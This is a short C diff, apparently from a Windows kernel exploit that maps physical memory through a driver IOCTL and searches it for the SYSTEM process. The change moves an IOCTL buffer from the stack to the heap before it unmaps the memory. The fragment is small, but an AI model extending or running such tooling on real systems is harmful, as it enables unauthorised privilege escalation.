@@ -75,13 +75,14 @@ int main(char argc, char** argv)
 					printf("Found SYSTEM!\n");
 					system("pause");
 				}
-				IOCTL_buffer buffer = { 0 };
-				buffer.SectionHandle = hPhysicalMemory;
-				buffer.PhysicalBaseAddress = buf;
-				if (UnmapPhysicalMemory(&buffer) == 1) {
+				IOCTL_buffer* buffer = (IOCTL_buffer*)malloc(sizeof(IOCTL_buffer));
+				buffer->SectionHandle = hPhysicalMemory;
+				buffer->PhysicalBaseAddress = buf;
+				if (UnmapPhysicalMemory(buffer) == 1) {
 					printf("UnmapPhysicalMemory failed");
 					return EXIT_FAILURE;
 				}
+				free(buffer);
 			}
 		}
 	}
